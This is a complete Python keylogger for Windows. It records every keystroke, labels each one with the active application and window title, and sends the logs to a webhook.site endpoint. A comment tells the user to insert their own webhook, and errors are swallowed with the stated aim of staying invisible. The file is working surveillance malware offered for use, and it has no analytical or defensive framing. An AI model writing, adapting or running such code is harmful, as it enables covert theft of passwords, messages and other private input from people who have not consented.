import threading
import time
import requests
import os
import win32gui
import win32process
import psutil
from pynput import keyboard

WEBHOOK_URL = "https://webhook.site/81a64f08-5e40-4dd2-8547-601e7ead08dc"  # <--- put your webhook endpoint here

class AppKeylogger:
    def __init__(self):
        self.current_app = None
        self.log_buffer = []
        self.lock = threading.Lock()
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.app_check_thread = threading.Thread(target=self.check_app_change, daemon=True)
        self.running = True

    def get_active_app(self):
        hwnd = win32gui.GetForegroundWindow()
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        try:
            proc = psutil.Process(pid)
            app_name = proc.name()
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            app_name = "Unknown"
        window_title = win32gui.GetWindowText(hwnd)
        return f"{app_name} - {window_title}"

    def check_app_change(self):
        last_app = None
        while self.running:
            app = self.get_active_app()
            if app != last_app:
                with self.lock:
                    if self.log_buffer:
                        self.send_buffer(last_app)
                        self.log_buffer = []
                    self.log_buffer.append(f"--- Switched to: {app} ---\n")
                last_app = app
                self.current_app = app
            time.sleep(0.5)  # check twice per second

    def on_press(self, key):
        with self.lock:
            if hasattr(key, 'char') and key.char is not None:
                self.log_buffer.append(key.char)
            elif hasattr(key, 'name'):
                if key.name == 'space':
                    self.log_buffer.append(' ')
                elif key.name == 'enter':
                    self.log_buffer.append('\n')
                else:
                    self.log_buffer.append(f'[{key.name.upper()}]')
            else:
                self.log_buffer.append(str(key))

    def send_buffer(self, app_name):
        content = ''.join(self.log_buffer)
        data = {
            'application': app_name,
            'log': content,
        }
        try:
            requests.post(WEBHOOK_URL, json=data, timeout=5)
        except Exception:
            pass  # Suppress errors to remain invisible

    def start(self):
        self.app_check_thread.start()
        self.listener.start()
        self.listener.join()
        self.running = False
        with self.lock:
            if self.log_buffer:
                self.send_buffer(self.current_app)

if __name__ == "__main__":
    kl = AppKeylogger()
    kl.start()
